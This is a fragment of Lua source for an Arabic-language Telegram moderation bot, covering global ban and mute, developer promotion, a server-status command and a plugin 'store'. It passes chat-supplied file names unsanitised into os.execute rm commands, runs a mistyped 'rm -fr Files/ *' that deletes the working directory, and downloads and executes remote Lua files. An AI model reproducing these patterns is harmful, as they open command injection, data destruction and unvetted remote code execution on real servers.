return false 
end
if database:sismember(bot_id..'Sudo:bot2', userid) then
send(msg.chat_id_, msg.id_, " ⋄لا تسطيع (حظر-كتم) المطور الثاني عام")
return false 
end
if database:sismember(bot_id..'Sudo:bot3', userid) then
send(msg.chat_id_, msg.id_, " ⋄لا تسطيع (حظر-كتم) المطور الثالث عام")
return false 
end

database:sadd(bot_id..'GBan:User', userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
status  = '\n⋄تم حظره عام في {`'..Groups..'`} جروب'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n⋄العضو »> '..userid..''
status  = '\n⋄تم حظره عام في {`'..Groups..'`} جروب'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
if text == ("كتم عام") and msg.reply_to_message_id_ then
if not SudoBot2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
return false
end
local Groups = database:scard(bot_id..'Chek:Groups')  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
function start_function(extra, result, success)

if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " ⋄لا تسطيع (حظر-كتم) البوت عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(944353237) then  
send(msg.chat_id_, msg.id_, " ⋄لا تسطيع (حظر-كتم) المبرمج عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(1360140225) then  
send(msg.chat_id_, msg.id_, " ⋄لا تسطيع (حظر-كتم) مـبـرمـج افـايـره عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(1770288756) then  
send(msg.chat_id_, msg.id_, " ⋄لا تسطيع (حظر-كتم) مـبـرمـج افـايـره² عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(1110101001) then  
send(msg.chat_id_, msg.id_, " ⋄لا تسطيع (حظر-كتم) المبرمج ليجاند عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(1110100000) then  
send(msg.chat_id_, msg.id_, " ⋄لا تسطيع (حظر-كتم) عضو غير معروف عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(119541395) then  
send(msg.chat_id_, msg.id_, " ⋄لا تسطيع (حظر-كتم) المطور صوفي عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(SUDO) then  
send(msg.chat_id_, msg.id_, " ⋄لا تسطيع (حظر-كتم) المطور الاساسي عام")
return false 
end
if database:sismember(bot_id..'Sudo:bot', result.sender_user_id_) then
send(msg.chat_id_, msg.id_, " ⋄لا تسطيع (حظر-كتم) المطور الاساسي عام")
return false 
end
if database:sismember(bot_id..'Sudo:bot2', result.sender_user_id_) then
send(msg.chat_id_, msg.id_, " ⋄لا تسطيع (حظر-كتم) المطور الثاني عام")
return false 
end
if database:sismember(bot_id..'Sudo:bot3', result.sender_user_id_) then
send(msg.chat_id_, msg.id_, " ⋄لا تسطيع (حظر-كتم) المطور الثالث عام")
return false 
end

database:sadd(bot_id..'Gmute:User', result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},
function(arg,data) 
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
status  = '\n⋄تم كتمه عام في {`'..Groups..'`} جروب'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^كتم عام @(.*)$")  and SudoBot2(msg) then
local username = text:match("^كتم عام @(.*)$") 
local Groups = database:scard(bot_id..'Chek:Groups')  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⋄عذرا عزيزي هاذا ليس معرف عضو قد يكون قناه او مجموعه")
return false
end
if tonumber(result.id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " ⋄لا تسطيع (حظر-كتم) البوت عام")
return false 
end
if tonumber(result.id_) == tonumber(944353237) then  
send(msg.chat_id_, msg.id_, " ⋄لا تسطيع (حظر-كتم) المبرمج عام")
return false 
end
if tonumber(result.id_) == tonumber(1360140225) then  
send(msg.chat_id_, msg.id_, " ⋄لا تسطيع (حظر-كتم) مـبـرمـج افـايـره عام")
return false 
end
if tonumber(result.id_) == tonumber(1770288756) then  
send(msg.chat_id_, msg.id_, " ⋄لا تسطيع (حظر-كتم) مـبـرمـج افـايـره² عام")
return false 
end
if tonumber(result.id_) == tonumber(1110101001) then  
send(msg.chat_id_, msg.id_, " ⋄لا تسطيع (حظر-كتم) المبرمج ليجاند عام")
return false 
end
if tonumber(result.id_) == tonumber(1110100000) then  
send(msg.chat_id_, msg.id_, " ⋄لا تسطيع (حظر-كتم) عضو غير معروف عام")
return false 
end
if tonumber(result.id_) == tonumber(119541395) then  
send(msg.chat_id_, msg.id_, " ⋄لا تسطيع (حظر-كتم) المطور صوفي عام")
return false 
end
if tonumber(result.id_) == tonumber(SUDO) then  
send(msg.chat_id_, msg.id_, " ⋄لا تسطيع (حظر-كتم) المطور الاساسي عام")
return false 
end
if database:sismember(bot_id..'Sudo:bot', result.id_) then
send(msg.chat_id_, msg.id_, " ⋄لا تسطيع (حظر-كتم) المطور الاساسي عام")
return false 
end
if database:sismember(bot_id..'Sudo:bot2', result.id_) then
send(msg.chat_id_, msg.id_, " ⋄لا تسطيع (حظر-كتم) المطور الثاني عام")
return false 
end
if database:sismember(bot_id..'Sudo:bot3', result.id_) then
send(msg.chat_id_, msg.id_, " ⋄لا تسطيع (حظر-كتم) المطور الثالث عام")
return false 
end

usertext = '\n⋄العضو »> ['..result.title_..'](t.me/'..(username or 'SOPOWERB0T')..')'
status  = '\n⋄تم كتمه عام في {`'..Groups..'`} جروب'
texts = usertext..status
database:sadd(bot_id..'Gmute:User', result.id_)
else
texts = ' ⋄لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^كتم عام (%d+)$") and SudoBot2(msg) then
local userid = text:match("^كتم عام (%d+)$")
local Groups = database:scard(bot_id..'Chek:Groups')  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
if tonumber(userid) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " ⋄لا تسطيع (حظر-كتم) البوت عام")
return false 
end
if tonumber(userid) == tonumber(944353237) then  
send(msg.chat_id_, msg.id_, " ⋄لا تسطيع (حظر-كتم) المبرمج عام")
return false 
end
if tonumber(userid) == tonumber(1360140225) then  
send(msg.chat_id_, msg.id_, " ⋄لا تسطيع (حظر-كتم) مـبـرمـج افـايـره عام")
return false 
end
if tonumber(userid) == tonumber(1770288756) then  
send(msg.chat_id_, msg.id_, " ⋄لا تسطيع (حظر-كتم) مـبـرمـج افـايـره² عام")
return false 
end
if tonumber(userid) == tonumber(1110101001) then  
send(msg.chat_id_, msg.id_, " ⋄لا تسطيع (حظر-كتم) المبرمج ليجاند عام")
return false 
end
if tonumber(userid) == tonumber(1110100000) then  
send(msg.chat_id_, msg.id_, " ⋄لا تسطيع (حظر-كتم) عضو غير معروف عام")
return false 
end
if tonumber(userid) == tonumber(119541395) then  
send(msg.chat_id_, msg.id_, " ⋄لا تسطيع (حظر-كتم) المطور صوفي عام")
return false 
end
if tonumber(userid) == tonumber(SUDO) then  
send(msg.chat_id_, msg.id_, " ⋄لا تسطيع (حظر-كتم) المطور الاساسي عام")
return false 
end
if database:sismember(bot_id..'Sudo:bot', userid) then
send(msg.chat_id_, msg.id_, " ⋄لا تسطيع (حظر-كتم) المطور الاساسي عام")
return false 
end
if database:sismember(bot_id..'Sudo:bot2', userid) then
send(msg.chat_id_, msg.id_, " ⋄لا تسطيع (حظر-كتم) المطور الثاني عام")
return false 
end
if database:sismember(bot_id..'Sudo:bot3', userid) then
send(msg.chat_id_, msg.id_, " ⋄لا تسطيع (حظر-كتم) المطور الثالث عام")
return false 
end

database:sadd(bot_id..'Gmute:User', userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
status  = '\n⋄تم كتمه عام في {`'..Groups..'`} جروب'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n⋄العضو »> '..userid..''
status  = '\n⋄تم كتمه عام في {`'..Groups..'`} جروب'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
if text == ("الغاء العام") and msg.reply_to_message_id_ then
if not SudoBot2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
return false
end
local Groups = database:scard(bot_id..'Chek:Groups')  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
function start_function(extra, result, success)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
status  = '\n⋄تم الغاء (الحظر-الكتم) عام من {`'..Groups..'`} جروب '
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
database:srem(bot_id..'GBan:User', result.sender_user_id_)
database:srem(bot_id..'Gmute:User', result.sender_user_id_)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^الغاء العام @(.*)$") and SudoBot2(msg) then
local username = text:match("^الغاء العام @(.*)$") 
local Groups = database:scard(bot_id..'Chek:Groups')  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⋄عذرا عزيزي هاذا ليس معرف عضو قد يكون قناه او مجموعه")
return false
end
usertext = '\n⋄العضو »> ['..result.title_..'](t.me/'..(username or 'SOPOWERB0T')..')'
status  = '\n⋄تم الغاء (الحظر-الكتم) عام من {`'..Groups..'`} جروب'
texts = usertext..status
database:srem(bot_id..'GBan:User', result.id_)
database:srem(bot_id..'Gmute:User', result.id_)
else
texts = ' ⋄لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^الغاء العام (%d+)$") and SudoBot2(msg) then
local userid = text:match("^الغاء العام (%d+)$")
local Groups = database:scard(bot_id..'Chek:Groups')  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
database:srem(bot_id..'GBan:User', userid)
database:srem(bot_id..'Gmute:User', userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
status  = '\n⋄تم الغاء (الحظر-الكتم) عام من {`'..Groups..'`} جروب'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n⋄العضو »> '..userid..''
status  = '\n⋄تم الغاء (الحظر-الكتم) عام من {`'..Groups..'`} جروب'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
------------------------------------------------------------------------
if text == ('مسح المطورين الثالثين') then
if not SudoBot2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
return false
end
database:del(bot_id..'Sudo:bot3')
send(msg.chat_id_, msg.id_, "\n⋄تم مسح قائمة المطورين الثالثين ")
end
if text == ('المطورين الثالثين') then
if not SudoBot2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
return false
end
local list = database:smembers(bot_id..'Sudo:bot3')
t = "\n⋄قائمة مطورين البوت \n•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = " ⋄لا يوجد مطورين"
end
send(msg.chat_id_, msg.id_, t)
end
if text == 'السيرفر' then
if not DEV(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
return false
end 
local inline = {{{text = '𝘾𝙃𝘼𝙉𝙉𝙀𝙇', url="t.me/SOPOWERB0T"}},} 
local server = io.popen([[
linux_version=`lsb_release -ds`
memUsedPrc=`free -m | awk 'NR==2{printf "%sMB/%sMB {%.2f%}\n", $3,$2,$3*100/$2 }'`
HardDisk=`df -lh | awk '{if ($6 == "/") { print $3"/"$2" ~ {"$5"}" }}'`
CPUPer=`top -b -n1 | grep "Cpu(s)" | awk '{print $2 + $4}'`
uptime=`uptime | awk -F'( |,|:)+' '{if ($7=="min") m=$6; else {if ($7~/^day/) {d=$6;h=$8;m=$9} else {h=$6;m=$7}}} {print d+0,"days,",h+0,"hours,",m+0,"minutes."}'`
echo '[BY AHMEDYAD](t.me/UUOUOU_7)\n☉✔{ نظام التشغيل } ⊰•\n`'"$linux_version"'`' 
echo '≪┉┉┉┉𝐏𝐎𝐖𝐄𝐑┉┉┉┉≫\n☉✔{ الذاكره العشوائيه } ⊰•\n`'"$memUsedPrc"'`'
echo '≪┉┉┉┉𝐏𝐎𝐖𝐄𝐑┉┉┉┉≫\n☉✔{ وحـده الـتـخـزيـن } ⊰•\n`'"$HardDisk"'`'
echo '≪┉┉┉┉𝐏𝐎𝐖𝐄𝐑┉┉┉┉≫\n☉✔{ الـمــعــالــج } ⊰•\n`'"`grep -c processor /proc/cpuinfo`""Core ~ {$CPUPer%} "'`'
echo '≪┉┉┉┉𝐏𝐎𝐖𝐄𝐑┉┉┉┉≫\n☉✔{ موقـع الـسـيـرفـر } ⊰•\n`'`curl https://devdeiveddev.ml/IP/Location.php`'`'
echo '≪┉┉┉┉𝐏𝐎𝐖𝐄𝐑┉┉┉┉≫\n☉✔{ الــدخــول } ⊰•\n`'`whoami`'`'
echo '≪┉┉┉┉𝐏𝐎𝐖𝐄𝐑┉┉┉┉≫\n☉✔{ مـده تـشغيـل الـسـيـرفـر } ⊰•  \n`'"$uptime"'`'
]]):read('*all')
send_inline_key(msg.chat_id_,server,nil,inline,msg.id_/2097152/0.5)
end
if text:match("^all (.*)$") or text:match("^@all (.*)$") and CoSu(msg) then
local ttag = text:match("^all (.*)$") or text:match("^@all (.*)$")
if not database:get(bot_id..'Cick:all'..msg.chat_id_) then
if database:get(bot_id.."S00F4:all:Time"..msg.chat_id_..':'..msg.sender_user_id_) then  
return 
send(msg.chat_id_, msg.id_,"انتظر دقيقه من فضلك")
end
database:setex(bot_id..'S00F4:all:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true)
tdcli_function({ID="GetChannelFull",channel_id_ = msg.chat_id_:gsub('-100','')},function(argg,dataa) 
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = dataa.member_count_},function(ta,sofi)
x = 0
tags = 0
local list = sofi.members_
for k, v in pairs(list) do
tdcli_function({ID="GetUser",user_id_ = v.user_id_},function(arg,data)
if x == 5 or x == tags or k == 0 then
tags = x + 5
t = "#all "..ttag..""
end
x = x + 1
tagname = data.first_name_
tagname = tagname:gsub("]","")
tagname = tagname:gsub("[[]","")
t = t..", ["..tagname.."](tg://user?id="..v.user_id_..")"
if x == 5 or x == tags or k == 0 then
local Text = t:gsub('#all '..ttag..',','#all '..ttag..'\n')
sendText(msg.chat_id_,Text,0,'md')
end
end,nil)
end
end,nil)
end,nil)
end
end
if text == "all" or text == "@all" and CoSu(msg) then
if not database:get(bot_id..'Cick:all'..msg.chat_id_) then
if database:get(bot_id.."S00F4:all:Time"..msg.chat_id_..':'..msg.sender_user_id_) then  
return 
send(msg.chat_id_, msg.id_,"انتظر دقيقه من فضلك")
end
database:setex(bot_id..'S00F4:all:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true)
tdcli_function({ID="GetChannelFull",channel_id_ = msg.chat_id_:gsub('-100','')},function(argg,dataa) 
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = dataa.member_count_},function(ta,sofi)
x = 0
tags = 0
local list = sofi.members_
for k, v in pairs(list) do
tdcli_function({ID="GetUser",user_id_ = v.user_id_},function(arg,data)
if x == 5 or x == tags or k == 0 then
tags = x + 5
t = "#all"
end
x = x + 1
tagname = data.first_name_
tagname = tagname:gsub("]","")
tagname = tagname:gsub("[[]","")
t = t..", ["..tagname.."](tg://user?id="..v.user_id_..")"
if x == 5 or x == tags or k == 0 then
local Text = t:gsub('#all,','#all\n')
sendText(msg.chat_id_,Text,0,'md')
end
end,nil)
end
end,nil)
end,nil)
end
end
if text == 'ملفات السورس' then
if not DEV(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المبرمج لاستخدام هذا الامر')
return false
end
t = ' ⋄الملفات السورس الموجوده في البوت ↓\n•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉• \n'
i = 0
for v in io.popen('ls'):lines() do
if v:match("$") then
i = i + 1
t = t..i..'- الملف »> {`'..v..'`}\n'
end
end
send(msg.chat_id_, msg.id_,t)
end
if text == 'الملفات' then
if not SudoBot2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
return false
end
t = ' ⋄الملفات الموجوده في البوت ↓\n•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉• \n'
i = 0
for v in io.popen('ls Files'):lines() do
if v:match(".lua$") then
i = i + 1
t = t..i..'- الملف »> {`'..v..'`}\n'
end
end
send(msg.chat_id_, msg.id_,t)
end
if text == "المتجر" or text == 'متجر الملفات' then
if SudoBot2(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/UUOUOU_7/files-power/master/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n⋄اهلا بك في متجر ملفات سورس بلاك\n⋄ملفات السورس ↓\n•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•\n\n"
local TextE = "\n•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•\n⋄علامة { ✔️ } تعني ملف محمل\n⋄علامة { ✖ } تعني ملف محذوف\n⋄لي تحميل ملف اكتب `تحميل` + اسم الملف\n⋄لي مسح ملف اكتب `مسح` + اسم الملف"
local NumFile = 0
for name,Info in pairs(res.plugins_) do
local Check_File_is_Found = io.open("Files/"..name,"r")
if Check_File_is_Found then
io.close(Check_File_is_Found)
CeckFile = "(✔️)"
else
CeckFile = "(✖)"
end
NumFile = NumFile + 1
TextS = TextS.."⋄"..Info..' \n⋄'..NumFile.." `"..name..'` '..CeckFile.."\n"
end
send(msg.chat_id_, msg.id_,TextS..TextE) 
end
else
send(msg.chat_id_, msg.id_," ⋄المتجر معطل حاليا \n") 
end
return false
end
end

if text and text:match("^(مسح) (.*)(.lua)$") and SudoBot2(msg) then
local name_t = {string.match(text, "^(مسح) (.*)(.lua)$")}
local file = name_t[2]..'.lua'
local file_bot = io.open("Files/"..file,"r")
if file_bot then
io.close(file_bot)
t = " ⋄الملف »> `"..file.."`\n⋄تم مسح ملف \n"
else
t = " ⋄بالتاكيد تم مسح ملف → `"..file.."`\n"
end
local json_file, res = https.request("https://raw.githubusercontent.com/ayacay/files-bot/main/"..file)
if res == 200 then
os.execute("rm -fr Files/"..file)
send(msg.chat_id_, msg.id_,t) 
dofile('Black.lua')  
else
send(msg.chat_id_, msg.id_," ⋄فشل مسح الملف \n") 
end
return false
end
if text and text:match("^(تحميل) (.*)(.lua)$") and SudoBot2(msg) then
local name_t = {string.match(text, "^(تحميل) (.*)(.lua)$")}
local file = name_t[2]..'.lua'
local file_bot = io.open("Files/"..file,"r")
if file_bot then
io.close(file_bot)
t = " ⋄بالتاكيد تم تحميل ملف → `"..file.."` \n"
else
t = " ⋄الملف »> `"..file.."`\n⋄تم تحميل ملف \n"
end
local json_file, res = https.request("https://raw.githubusercontent.com/ayacay/files-bot/main/"..file)
if res == 200 then
local chek = io.open("Files/"..file,'w+')
chek:write(json_file)
chek:close()
send(msg.chat_id_, msg.id_,t) 
dofile('Black.lua')  
else
send(msg.chat_id_, msg.id_," ⋄فشل تحميل الملف \n") 
end
return false
end
if text == "مسح الملفات" then
if not SudoBot2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
return false
end
os.execute("rm -fr Files/ *")
send(msg.chat_id_,msg.id_," ⋄تم مسح ملفات البوت يمكنك تحميلها من `المتجر`")
return false
end
if text == ("رفع مطور ثالث") or text == ("رفع مطور") and msg.reply_to_message_id_ then
if not SudoBot2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
return false
end
function start_function(extra, result, success)
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
database:sadd(bot_id..'Sudo:bot3', result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
status  = '\n⋄تم ترقيته مطور ثالث'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false 
end
if text and text:match("^رفع مطور ثالث @(.*)$") and SudoBot2(msg) then
local username = text:match("^رفع مطور ثالث @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⋄عذرا عزيزي هاذا ليس معرف عضو قد يكون قناه او مجموعه")
return false
end
database:sadd(bot_id..'Sudo:bot3', result.id_)
usertext = '\n⋄العضو »> ['..result.title_..'](t.me/'..(username or 'SOPOWERB0T')..')'
status  = '\n⋄تم ترقيته مطور ثالث'
texts = usertext..status
else
texts = ' ⋄لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false 
end
if text and text:match("^رفع مطور ثالث (%d+)$") and SudoBot2(msg) then
local userid = text:match("^رفع مطور ثالث (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
database:sadd(bot_id..'Sudo:bot3', userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
status  = '\n⋄تم ترقيته مطور ثالث'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n⋄العضو »> '..userid..''
status  = '\n⋄تم ترقيته مطور ثالث'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false 
end
if text == ("تنزيل مطور") or text == ("تنزيل مطور ثالث") and msg.reply_to_message_id_ then
if not SudoBot2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
